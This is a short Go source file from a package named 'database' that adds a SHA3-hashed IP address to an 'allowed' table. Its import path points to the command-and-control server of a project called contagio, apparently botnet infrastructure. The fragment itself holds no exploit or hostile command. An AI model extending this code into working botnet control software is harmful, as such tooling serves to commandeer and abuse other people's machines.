package database

import (
	"contagio/contagio/cnc/utils"
	"fmt"
)

func AddIp(ip string) {

	statement, err := Db.Prepare("INSERT INTO allowed(ip) VALUES (?)")

	if err != nil {
		fmt.Println(err)
		return
	}

	statement.Exec(utils.Sha3(ip))

}
